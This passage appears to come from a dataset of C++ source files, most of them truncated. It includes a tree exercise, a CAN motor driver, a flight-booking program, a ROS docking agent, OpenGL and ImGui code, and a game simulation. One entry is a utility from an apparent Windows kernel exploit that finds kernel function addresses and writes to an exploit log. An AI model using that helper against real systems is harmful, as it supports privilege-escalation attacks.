temp_pos=1<<tree.depth+1;\r\n\tif(pos<1||pos>temp_pos){\r\n\t\tcout<<\"\u8bbf\u95ee\u51fa\u754c\"<<endl;\r\n\t\treturn ERROR;\r\n\t}\r\n\te=tree.tree[pos-1].data;\r\n\treturn OK;\r\n}\r\n\r\n//\u5220\u9664\u67d0\u4e00\u4e2a\u8282\u70b9\u6570\u636e pos\u4ece1\u5f00\u59cb\r\ntemplate<typename T>\r\nSTATUS DeleteNode(TwoForkTreeOrder<T> &TREE,int pos){\r\n\tint temp_pos=1<<TREE.depth+1;\r\n\tif(pos<1||pos>temp_pos){\r\n\t\tcout<<\"\u8bbf\u95ee\u51fa\u754c\"<<endl;\r\n\t\treturn ERROR;\r\n\t}\r\n\t\r\n\tTREE.tree[pos-1].flag='^';\r\n}\r\nint main(){\r\n\treturn 0;\r\n}\r\n",
    "#include \"stdafx.h\"\n#include \"io.h\"\n\nvoid IO_OBJECT::StartIo()\n{\n\tAddRef();\n\tif (m_Io) TpStartAsyncIoOperation(m_Io);\n}\n\nIO_OBJECT::~IO_OBJECT()\n{\n\tif (m_Io)\n\t{\n\t\tTpReleaseIoCompletion(m_Io);\n\t}\n\tCloseObjectHandle(m_hFile);\n}\n\nvoid IO_OBJECT::CloseObjectHandle(HANDLE hFile)\n{\n\tif (hFile) NtClose(hFile);\n}\n\nvoid IO_OBJECT::Close()\n{\n\tif (HANDLE hFile = InterlockedExchangePointer(&m_hFile, 0))\n\t{\n\t\tCloseObjectHandle(hFile); \n\t}\n}\n\nNTSTATUS IO_OBJECT::BindIoCompletionCB(HANDLE hFile, PTP_IO_CALLBACK Callback)\n{\n\tTP_CALLBACK_ENVIRON CallbackEnviron, *pCallbackEnviron = 0;\n\tif (_G_Pool)\n\t{\n\t\tTpInitializeCallbackEnviron(&CallbackEnviron);\n\t\tTpSetCallbackThreadpool(&CallbackEnviron, _G_Pool);\n\t\tpCallbackEnviron = &CallbackEnviron;\n\t}\n\treturn TpAllocIoCompletion(&m_Io, hFile, Callback, this, pCallbackEnviron);\n}\n\nvoid NT_IRP::CheckNtStatus(IO_OBJECT* pObj, NTSTATUS status, BOOL bSkippedOnSynchronous)\n{\n\tif (status == STATUS_PENDING)\n\t{\n\t\treturn ;\n\t}\n\n\tif (NT_ERROR(status) || bSkippedOnSynchronous)\n\t{\n\t\tTpCancelAsyncIoOperation(pObj->m_Io);\n\t\tStatus = status;\n\t\tOnIoComplete(pObj, this);\n\t}\n}\n\nNT_IRP::NT_IRP(IO_OBJECT* pObj, DWORD Code, PVOID Ptr)\n{\n\tStatus = STATUS_PENDING;\n\tInformation = 0;\n\tPointer = Ptr;\n\tm_Code = Code;\n\tpObj->StartIo();\n}\n\nVOID NT_IRP::OnIoComplete(_Inout_opt_ PVOID Context, _In_ PIO_STATUS_BLOCK IoSB)\n{\n\treinterpret_cast<IO_OBJECT*>(Context)->IOCompletionRoutine(m_Code, IoSB->Status, IoSB->Information, Pointer);\n\treinterpret_cast<IO_OBJECT*>(Context)->Release();\n}\n\nVOID NTAPI NT_IRP::S_OnIoComplete(\n\t\t\t\t\t\t\t\t  _Inout_ PTP_CALLBACK_INSTANCE /*Instance*/,\n\t\t\t\t\t\t\t\t  _Inout_opt_ PVOID Context,\n\t\t\t\t\t\t\t\t  _In_ PVOID ApcContext,\n\t\t\t\t\t\t\t\t  _In_ PIO_STATUS_BLOCK IoSB,\n\t\t\t\t\t\t\t\t  _In_ PTP_IO /*Io*/\n\t\t\t\t\t\t\t\t  )\n{\n\treinterpret_cast<NT_IRP*>(ApcContext)->OnIoComplete(Context, IoSB);\n}\n\nVOID NTAPI NT_IRP::ApcRoutine (\n\t\t\t\t\t\t\t   PVOID ApcContext,\n\t\t\t\t\t\t\t   PIO_STATUS_BLOCK IoSB,\n\t\t\t\t\t\t\t   ULONG /*Reserved*/\n\t\t\t\t\t\t\t   )\n{\n\tstatic_cast<NT_IRP*>(IoSB)->OnIoComplete(ApcContext, IoSB);\n}",
    "#include \"xiaomi_cybergear_driver.h\"\n#include \"HardwareSerial.h\"\n#include <mcp_can.h>\n#include <SPI.h>\n\n// MCP2515 CAN controller instance\nextern MCP_CAN CAN0;\n\n/* PUBLIC */\nXiaomiCyberGearDriver::XiaomiCyberGearDriver() {}\nXiaomiCyberGearDriver::XiaomiCyberGearDriver(uint8_t cybergear_can_id, uint8_t master_can_id) \n    : _cybergear_can_id(cybergear_can_id),\n    _master_can_id(master_can_id),\n    _run_mode(MODE_MOTION),\n    _use_serial_debug(false)\n{}\n\nXiaomiCyberGearDriver::~XiaomiCyberGearDriver() {}\n\nint XiaomiCyberGearDriver::init_mcp2515(bool serial_debug /*=false*/) {\n    _use_serial_debug = serial_debug;\n\n    if (_use_serial_debug) {\n        Serial.begin(115200); \n        delay(500);\n    }\n\n    if (CAN0.begin(MCP_ANY, CAN_500KBPS, MCP_8MHZ) == CAN_OK) {\n        if (_use_serial_debug) Serial.println(\"MCP2515 Initialized Successfully\");\n        return 0;\n    } else {\n        if (_use_serial_debug) Serial.println(\"MCP2515 Initialization Failed\");\n        return -1;\n    }\n}\n\nvoid XiaomiCyberGearDriver::init_motor(uint8_t mode) {\n    stop_motor();\n    set_run_mode(mode);\n}\n\nvoid XiaomiCyberGearDriver::enable_motor() {\n    uint8_t data[8] = {0x00};\n    _send_can_package(_cybergear_can_id, CMD_ENABLE, _master_can_id, 8, data);\n}\n\nvoid XiaomiCyberGearDriver::stop_motor() {\n    uint8_t data[8] = {0x00};\n    _send_can_package(_cybergear_can_id, CMD_STOP, _master_can_id, 8, data);\n}\n\nvoid XiaomiCyberGearDriver::set_run_mode(uint8_t mode) {\n    _run_mode = mode;\n    uint8_t data[8] = {0x00};\n    data[0] = ADDR_RUN_MODE & 0x00FF;\n    data[1] = ADDR_RUN_MODE >> 8;\n    data[4] = mode;\n    _send_can_package(_cybergear_can_id, CMD_RAM_WRITE, _master_can_id, 8, data);\n}\n\nvoid XiaomiCyberGearDriver::set_limit_speed(float speed) {\n    _send_can_float_package(_cybergear_can_id, ADDR_LIMIT_SPEED, speed, 0.0f, V_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_limit_current(float current) {\n    _send_can_float_package(_cybergear_can_id, ADDR_LIMIT_CURRENT, current, 0.0f, I_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_limit_torque(float torque) {\n    _send_can_float_package(_cybergear_can_id, ADDR_LIMIT_TORQUE, torque, 0.0f, T_MAX);\n}\n\n// MODE_MOTION\nvoid XiaomiCyberGearDriver::send_motion_control(XiaomiCyberGearMotionCommand cmd) {\n    uint8_t data[8] = {0x00};\n\n    uint16_t position = _float_to_uint(cmd.position, POS_MIN, POS_MAX, 16);\n    data[0] = position >> 8;\n    data[1] = position & 0x00FF;\n\n    uint16_t speed = _float_to_uint(cmd.speed, V_MIN, V_MAX, 16);\n    data[2] = speed >> 8;\n    data[3] = speed & 0x00FF;\n\n    uint16_t kp = _float_to_uint(cmd.kp, KP_MIN, KP_MAX, 16);\n    data[4] = kp >> 8;\n    data[5] = kp & 0x00FF;\n\n    uint16_t kd = _float_to_uint(cmd.kd, KD_MIN, KD_MAX, 16);\n    data[6] = kd >> 8;\n    data[7] = kd & 0x00FF;\n\n    uint16_t torque = _float_to_uint(cmd.torque, T_MIN, T_MAX, 16);\n\n    _send_can_package(_cybergear_can_id, CMD_POSITION, torque, 8, data);\n}\n\n// MODE_CURRENT\nvoid XiaomiCyberGearDriver::set_current_kp(float kp) {\n    _send_can_float_package(_cybergear_can_id, ADDR_CURRENT_KP, kp, KP_MIN, KP_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_current_ki(float ki) {\n    _send_can_float_package(_cybergear_can_id, ADDR_CURRENT_KI, ki, KI_MIN, KI_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_current_filter_gain(float gain) {\n    _send_can_float_package(_cybergear_can_id, ADDR_CURRENT_FILTER_GAIN, gain, CURRENT_FILTER_GAIN_MIN, CURRENT_FILTER_GAIN_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_current_ref(float current) {\n    _send_can_float_package(_cybergear_can_id, ADDR_I_REF, current, I_MIN, I_MAX);\n}\n\n// MODE_POSITION\nvoid XiaomiCyberGearDriver::set_position_kp(float kp) {\n    _send_can_float_package(_cybergear_can_id, ADDR_POSITION_KP, kp, KP_MIN, KP_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_position_ref(float position) {\n    _send_can_float_package(_cybergear_can_id, ADDR_POSITION_REF, position, POS_MIN, POS_MAX);\n}\n\n// MODE_SPEED\nvoid XiaomiCyberGearDriver::set_speed_kp(float kp) {\n    _send_can_float_package(_cybergear_can_id, ADDR_SPEED_KP, kp, KP_MIN, KP_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_speed_ki(float ki) {\n    _send_can_float_package(_cybergear_can_id, ADDR_SPEED_KI, ki, KI_MIN, KI_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_speed_ref(float speed) {\n    _send_can_float_package(_cybergear_can_id, ADDR_SPEED_REF, speed, V_MIN, V_MAX);\n}\n\nvoid XiaomiCyberGearDriver::set_motor_can_id(uint8_t can_id) {\n    uint8_t data[8] = {0x00};\n    uint16_t option = can_id << 8 | _master_can_id;\n    _send_can_package(_cybergear_can_id, CMD_SET_CAN_ID, option, 8, data);\n    _cybergear_can_id = can_id;\n}\n\nuint8_t XiaomiCyberGearDriver::get_run_mode() const {\n    return _run_mode;\n}\n\nuint8_t XiaomiCyberGearDriver::get_motor_can_id() const {\n    return _cybergear_can_id;\n}\n\nvoid XiaomiCyberGearDriver::request_status() {\n    uint8_t data[8] = {0x00};\n    _send_can_package(_cybergear_can_id, CMD_GET_STATUS, _master_can_id, 8, data);\n}\n\nvoid XiaomiCyberGearDriver::process_message() {\n    long unsigned int rxId;\n    unsigned char l",
    "#include <iostream>\r\n#include <cstring> // for string functions\r\nusing namespace std;\r\n\r\nclass Passenger {\r\npublic:\r\n    char passportId[50]; // Passport ID of the passenger\r\n    string bookedFlightNumber; // Flight number booked by the passenger\r\n    string bookedDestination; // Destination of the booked flight\r\n    string bookedDepartureTime; // Departure time of the booked flight\r\n    string bookedArrivalTime; // Arrival time of the booked flight\r\n    string bookedSeatClass; // Seat class of the booked flight: \"First\", \"Business\", \"Economy\"\r\n    double bookedPrice; // Price of the booked flight\r\n    Passenger* next; // Pointer to the next passenger node\r\n\r\n    // Constructor\r\n    Passenger(const char* passportId) {\r\n        strcpy(this->passportId, passportId);\r\n        next = nullptr; // Initialize next pointer to nullptr\r\n        // Initialize booking details\r\n        bookedFlightNumber = \"\";\r\n        bookedDestination = \"\";\r\n        bookedDepartureTime = \"\";\r\n        bookedArrivalTime = \"\";\r\n        bookedSeatClass = \"\";\r\n        bookedPrice = 0.0;\r\n    }\r\n};\r\n\r\nclass Flight {\r\nprivate:\r\n    string flight_number, destination, departure_time, arrival_time;\r\n    int first_class_seats, business_class_seats, economy_class_seats;\r\n    double first_class_price, business_class_price, economy_class_price;\r\n    Passenger* passengersHead; // Pointer to the head of the linked list of passengers\r\n\r\npublic:\r\n    Flight();\r\n    void addFlight();\r\n    void displayAllFlights();\r\n    void bookSeat();\r\n    void findBookingByPassportId(const char* passportId);\r\n    bool isAdmin;\r\n};\r\n\r\nFlight::Flight() {\r\n    passengersHead = nullptr;\r\n    isAdmin = false; // Initially assume the user is not an admin\r\n}\r\n\r\nvoid Flight::addFlight() {\r\n    if (!isAdmin) {\r\n        cout << \"Only admin can add flights.\" << endl;\r\n        return;\r\n    }\r\n    cout << \"Enter flight details: \" << endl;\r\n    cout << \"Flight Number: \";\r\n    cin >> flight_number;\r\n\r\n    cout << \"Enter number of available seats: \" << endl;\r\n    cout << \"First Class: \";\r\n    cin >> first_class_seats;\r\n    cout << \"Business Class: \";\r\n    cin >> business_class_seats;\r\n    cout << \"Economy Class: \";\r\n    cin >> economy_class_seats;\r\n\r\n    cout << \"Enter prices for each class: \" << endl;\r\n    cout << \"First Class: \";\r\n    cin >> first_class_price;\r\n    cout << \"Business Class: \";\r\n    cin >> business_class_price;\r\n    cout << \"Economy Class: \";\r\n    cin >> economy_class_price;\r\n\r\n    cout << \"Enter Destination : \" << endl;\r\n    cin >> destination;\r\n\r\n    cout << \"Arrival Time : \" << endl;\r\n    cin >> arrival_time;\r\n\r\n    cout << \"Departure Time : \" << endl;\r\n    cin >> departure_time;\r\n\r\n    cout << \"Flight added successfully!\" << endl;\r\n}\r\n\r\nvoid Flight::displayAllFlights() {\r\n    cout << \"\\nAvailable Flights:\" << endl;\r\n    cout << \"Flight Number: \" << flight_number << endl;\r\n    cout << \"Destination: \" << destination << endl;\r\n    cout << \"Departure Time: \" << departure_time << \", Arrival Time: \" << arrival_time << endl;\r\n    cout << \"Available Seats: \" << endl;\r\n    cout << \"First Class: \" << first_class_seats << endl;\r\n    cout << \"Business Class: \" << business_class_seats << endl;\r\n    cout << \"Economy Class: \" << economy_class_seats << endl;\r\n    cout << \"------------------------\" << endl;\r\n}\r\n\r\nvoid Flight::bookSeat() {\r\n    string passportId;\r\n    string class_type;\r\n    int no_Of_Seats;\r\n\r\n    cout << \"Enter your Passport ID: \";\r\n    cin >> passportId;\r\n\r\n    cout << \"Enter desired seat class (First, Business, Economy): \";\r\n    cin >> class_type;\r\n    cout << \"Enter Number of Seats : \";\r\n    cin >> no_Of_Seats;\r\n\r\n    Passenger* passenger = new Passenger(passportId.c_str()); // Create a new Passenger object\r\n    passenger->bookedFlightNumber = flight_number;\r\n    passenger->bookedDestination = destination;\r\n    passenger->bookedDepartureTime = departure_time;\r\n    passenger->bookedArrivalTime = arrival_time;\r\n    passenger->bookedSeatClass = class_type; // Store the class type\r\n    passenger->bookedPrice = (class_type == \"First\") ? (first_class_price * no_Of_Seats) :\r\n                            (class_type == \"Business\") ? (business_class_price * no_Of_Seats) :\r\n                            (economy_class_price * no_Of_Seats);\r\n\r\n    // Add the passenger to the linked list\r\n    if (passengersHead == nullptr) {\r\n        passengersHead = passenger;\r\n    } else {\r\n        Passenger* currentPassenger = passengersHead;\r\n        while (currentPassenger->next != nullptr) {\r\n            currentPassenger = currentPassenger->next;\r\n        }\r\n        currentPassenger->next = passenger;\r\n    }\r\n\r\n    // Decrease available seats based on class\r\n    if (class_type == \"First\") {\r\n        first_class_seats -= no_Of_Seats;\r\n    } else if (class_type == \"Business\") {\r\n        business_class_seats -= no_Of_Seats;\r\n    } else if (class_type == \"Economy\") {\r\n        economy_class_seats -= no_Of_Seats;\r\n    }\r\n}\r\n\r\nvoid Flight::findBookingByPassportId(const char* passportId) {\r\n ",
    "// Copyright (c) 2024 Alberto J. Tudela Rold\u00e1n\r\n// Copyright (c) 2024 Grupo Avispa, DTE, Universidad de M\u00e1laga\r\n//\r\n// Licensed under the Apache License, Version 2.0 (the \"License\");\r\n// you may not use this file except in compliance with the License.\r\n// You may obtain a copy of the License at\r\n//\r\n//     http://www.apache.org/licenses/LICENSE-2.0\r\n//\r\n// Unless required by applicable law or agreed to in writing, software\r\n// distributed under the License is distributed on an \"AS IS\" BASIS,\r\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n// See the License for the specific language governing permissions and\r\n// limitations under the License.\r\n\r\n\r\n// C++\r\n#include <chrono>\r\n\r\n\r\n// DSR\r\n#include \"dsr_util/qt_executor.hpp\"\r\n#include \"dsr_agents/docking_agent.hpp\"\r\n\r\nnamespace dsr_agents\r\n{\r\n\r\nDockingAgent::DockingAgent()\r\n: dsr_util::AgentNode(\"docking_agent\")\r\n{\r\n  // Wait until the DSR graph is ready\r\n  std::this_thread::sleep_for(std::chrono::milliseconds(1000));\r\n}\r\n\r\nvoid DockingAgent::edge_updated(std::uint64_t from, std::uint64_t to, const std::string & type)\r\n{\r\n  // Check if the robot wants to abort or cancel the docking process: robot ---(abort)--> dock\r\n  if (type == \"abort\" || type == \"cancel\") {\r\n    auto robot_node = G_->get_node(from);\r\n    auto dock_node = G_->get_node(to);\r\n    if (robot_node.has_value() && robot_node.value().name() == source_ &&\r\n      dock_node.has_value() && dock_node.value().type() == \"dock\")\r\n    {\r\n      RCLCPP_INFO(this->get_logger(), \"Starting to docking\");\r\n      // Redock the dock node from the DSR graph\r\n      if (G_->delete_node(dock_node.value())) {\r\n        cancel_action();\r\n        RCLCPP_INFO(this->get_logger(), \"Docking %sed\", type.c_str());\r\n      }\r\n    }\r\n  } else if (type == \"wants_to\") {\r\n    // Check if the robot wants to start the navigation: robot ---(wants_to)--> dock\r\n    auto robot_node = G_->get_node(from);\r\n    auto dock_node = G_->get_node(to);\r\n    if (robot_node.has_value() && robot_node.value().name() == source_ &&\r\n      dock_node.has_value() && dock_node.value().type() == \"dock\")\r\n    {\r\n      RCLCPP_INFO(this->get_logger(), \"Starting the docking\");\r\n      start_docking();\r\n    }\r\n  }\r\n}\r\n\r\nvoid DockingAgent::dock_goal_response_callback(const GoalHandleDock::SharedPtr & goal_handle)\r\n{\r\n  goal_handle_ = goal_handle;\r\n  if (!goal_handle_) {\r\n    RCLCPP_ERROR(this->get_logger(), \"Docking goal was rejected by server\");\r\n  } else {\r\n    // Replace the 'wants_to' edge with a 'is_performing' edge between robot and dock\r\n    if (replace_edge<is_performing_edge_type>(source_, \"dock\", \"wants_to\")) {\r\n      RCLCPP_INFO(\r\n        this->get_logger(), \"Docking goal accepted by server, waiting for result\");\r\n    }\r\n  }\r\n}\r\n\r\nvoid DockingAgent::dock_feedback_callback(\r\n  GoalHandleDock::SharedPtr, const std::shared_ptr<const Dock::Feedback>/*feedback*/)\r\n{\r\n  // Replace the 'stopped' edge with a 'docking' edge between robot and navigation\r\n  auto stopped_edge = G_->get_edge(source_, \"navigation\", \"stopped\");\r\n  if (stopped_edge.has_value()) {\r\n    replace_edge<docking_edge_type>(source_, \"navigation\", \"stopped\");\r\n  }\r\n}\r\n\r\nvoid DockingAgent::dock_result_callback(const GoalHandleDock::WrappedResult & result)\r\n{\r\n  // Replace the 'docking' edge with a 'stopped' edge between robot and navigation\r\n  if (replace_edge<stopped_edge_type>(source_, \"navigation\", \"docking\")) {\r\n    switch (result.code) {\r\n      case rclcpp_action::ResultCode::SUCCEEDED:\r\n        // Replace the 'is_performing' edge with a 'finished' edge between robot and dock\r\n        if (replace_edge<finished_edge_type>(source_, \"dock\", \"is_performing\")) {\r\n          RCLCPP_INFO(this->get_logger(), \"Docking succeeded\");\r\n        }\r\n        break;\r\n      case rclcpp_action::ResultCode::ABORTED:\r\n        // Replace the 'is_performing' edge with a 'failed' edge between robot and dock\r\n        if (replace_edge<failed_edge_type>(source_, \"dock\", \"is_performing\")) {\r\n          RCLCPP_ERROR(this->get_logger(), \"Docking aborted\");\r\n        }\r\n        break;\r\n      case rclcpp_action::ResultCode::CANCELED:\r\n        // Replace the 'is_performing' edge with a 'canceled' edge between robot and dock\r\n        if (replace_edge<cancel_edge_type>(source_, \"dock\", \"is_performing\")) {\r\n          RCLCPP_ERROR(this->get_logger(), \"Docking canceled\");\r\n        }\r\n        break;\r\n      default:\r\n        RCLCPP_ERROR(this->get_logger(), \"Unknown result code\");\r\n        break;\r\n    }\r\n  }\r\n}\r\n\r\nvoid DockingAgent::undock_goal_response_callback(const GoalHandleUndock::SharedPtr & goal_handle)\r\n{\r\n  if (!goal_handle) {\r\n    RCLCPP_ERROR(this->get_logger(), \"Undocking goal was rejected by server\");\r\n  } else {\r\n    RCLCPP_INFO(this->get_logger(), \"Undocking goal accepted by server, waiting for result\");\r\n  }\r\n}\r\n\r\nvoid DockingAgent::undock_feedback_callback(\r\n  GoalHandleUndock::SharedPtr, const std::shared_ptr<const Undock::Feedback>/*feedback*/)\r\n{\r\n}\r\n\r\nvoid DockingAgent::undock_result_callba",
    "\n#include <GL/glut.h>\n#include <cmath>  // For math operations\n#include <iostream>\n\n// Function to plot a point with specific color\nvoid plotPoint(float x, float y, float r, float g, float b) {\n    // Set the color for the point\n    glColor3f(r, g, b);\n\n    // Begin drawing points\n    glBegin(GL_POINTS);\n    glVertex2f(x, y); // Specify the point\n    glEnd();\n}\n\n// Display function to render the scene\nvoid display() {\n    // Clear the color buffer\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    // Plot a point at (10, 10) with color red\n    plotPoint(10.0f, 10.0f, 1.0f, 0.0f, 0.0f); // Red color\n\n    // Plot another point at (-10, -10) with color blue\n    plotPoint(-10.0f, -10.0f, 0.0f, 0.0f, 1.0f); // Blue color\n\n    // Flush the drawing routines to the window\n    glFlush();\n}\n\n// Function to initialize the rendering environment\nvoid init() {\n    // Set the background color to white\n    glClearColor(0.0, 0.0, 0.0, 1.0);\n\n    // Set up the projection matrix for 2D\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluOrtho2D(-100, 100, -100, 100);\n\n    // Set up the model view matrix\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n}\n\nint main(int argc, char** argv) {\n    // Initialize GLUT\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n    glutInitWindowSize(512, 512);\n    glutCreateWindow(\"Point Plotting Example\");\n\n    // Initialize rendering settings\n    init();\n\n    // Register display callback function\n    glutDisplayFunc(display);\n\n    // Enter the event processing loop\n    glutMainLoop();\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n#include <vector>\n#include <fstream>\n#include <sstream>\n#include <iomanip>\n#include <iostream>\n#include <Psapi.h>\n\nstd::wofstream logFile(\"exploit_log.txt\", std::ios::app);\n\nvoid* GetKernelBase() {\n    std::vector<LPVOID> drivers(1024);\n    DWORD cbNeeded;\n    if (EnumDeviceDrivers(drivers.data(), sizeof(LPVOID) * drivers.size(), &cbNeeded) && cbNeeded < sizeof(LPVOID) * drivers.size()) {\n        return drivers[0]; // ntoskrnl.exe is usually the first driver loaded\n    }\n    return nullptr;\n}\n\nuintptr_t GetKernelFunctionAddress(const char* functionName) {\n    void* kernelBase = GetKernelBase();\n    if (!kernelBase) return 0;\n\n    HMODULE hNtoskrnl = LoadLibraryA(\"ntoskrnl.exe\");\n    if (!hNtoskrnl) return 0;\n\n    FARPROC funcAddress = GetProcAddress(hNtoskrnl, functionName);\n    if (!funcAddress) return 0;\n\n    uintptr_t offset = reinterpret_cast<uintptr_t>(funcAddress) - reinterpret_cast<uintptr_t>(hNtoskrnl);\n    return reinterpret_cast<uintptr_t>(kernelBase) + offset;\n}\n\nvoid Log(const std::wstring& message) {\n    logFile << message << std::endl;\n    logFile.flush();\n    OutputDebugStringW(message.c_str());\n    std::wcout << message << std::endl;\n}\n\nvoid LogPointer(const std::wstring& name, void* ptr) {\n    std::wstringstream ss;\n    ss << name << L\": \" << std::hex << std::setfill(L'0') << std::setw(16)\n        << reinterpret_cast<uintptr_t>(ptr);\n    Log(ss.str());\n}",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy VK_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <windowsx.h> // GET_X_LPARAM(), GET_Y_LPARAM()\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago)with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before a key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Inputs: Update mouse inputs using WM_MOUSEMOVE/WM_MOUSELEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Inputs: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-12-16: Inputs: Fill VK_LCONTROL/VK_RCONTROL/VK_LSHIFT/VK_RSHIFT/VK_LMENU/VK_RMENU for completeness.\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host window doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Visual Studio users will need to link with dwmapi.lib (MinGW/gcc: use -ldwmapi).\n//  2021-02-17: Fixed ImGui_ImplWin32_EnableDpiAwareness() attempting to get SetProcessDpiAwareness from shcore.dll on Windows 8 whereas it is only supported on Windows 8.1.\n//  2021-01-25: Inputs: Dynamically loading XInput DLL.\n//  2020-12-04: Misc: Fixed setting of io.DisplaySize to invalid/uninitialized data when after hwnd has been closed.\n//  2020-03-03: Inputs: Calling AddInputCharacterUTF16() to support surrogate pairs leading to codepoint >= 0x10000 (for more complete CJK inputs)\n//  2020-02-17: Added ImGui_ImplWin32_EnableDpiAwareness(), ImGui_ImplWin32_GetDpiScaleForHwnd(), ImGui_ImplWin32_GetDpiScaleForMonitor() helper functions.\n//  2020-01-14: Inputs: Added support for #define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD/IMGUI_IMPL_WIN32_DISABLE_LINKING_XINPUT.\n//  2019-12-05: Inputs: Added support for ",
    "#include \"simulate.h\"\n\n#include <vector>\n#include <iostream>\n#include \"limits.h\"\n#include \"float.h\"\n\n#include \"utility.h\"\n\n\n\n\nint simulate(\n    std::vector<std::vector<std::vector<int>>> & pos, \n    std::vector<std::vector<hero>> & stats\n) {\n\n    double min_multiple = DBL_MAX;\n    int min_units = INT_MAX;\n\n    // calculate who has the closest action\n    for(int i = 0; i < pos.size(); i++) {\n        for(int j = 0; j < pos[i].size(); j++) {\n\n            double left = (pos[i][j][1]) ? (100 - pos[i][j][0]) : pos[i][j][0] ;\n            double multiple = left / (double)stats[i][j].get_b().get_speed();\n            min_multiple = (min_multiple > multiple) ? multiple : min_multiple;\n\n            std::cout << i << \" \" << j << \" \" << left << \" \" << multiple << \" \" << stats[i][j].get_b().get_speed() << \" \" << min_multiple << std::endl;\n        }\n    }\n\n    // calculate next positions for everyone else\n    for(int i = 0; i < pos.size(); i++) {\n        for(int j = 0; j < pos[i].size(); j++) {\n\n            std::cout << i <<\" \" << j << \": \" << pos[i][j][0] << \" \" << pos[i][j][1] << \"; \";\n            pos[i][j][0] = (pos[i][j][1]) ? pos[i][j][0] + round5(min_multiple * (double)stats[i][j].get_b().get_speed() ) : pos[i][j][0] - round5(min_multiple * (double)stats[i][j].get_b().get_speed() );\n            if( (pos[i][j][0] >= 100) && (pos[i][j][1]) ) {\n                pos[i][j][0] = 100;\n                pos[i][j][1] = false;\n            }\n            else if( (pos[i][j][0] <= 0) && (!pos[i][j][1]) ) {\n                pos[i][j][0] = 0;\n                pos[i][j][1] = true;\n            }\n            std::cout << pos[i][j][0] << \" \" << pos[i][j][1] << std::endl;\n\n        }\n    }\n\n    return min_units;\n}\n\nint get_closest_to_action(\n    std::vector<std::vector<std::vector<int>>> & pos,\n    std::vector<std::vector<hero>> & stats,\n    int team\n) {\n    \n    int closest = 0;\n    double min_multiple = DBL_MAX;\n\n    for(int i = 0; i < pos[team].size(); i++) {\n            double left = (pos[team][i][1]) ? (100 - 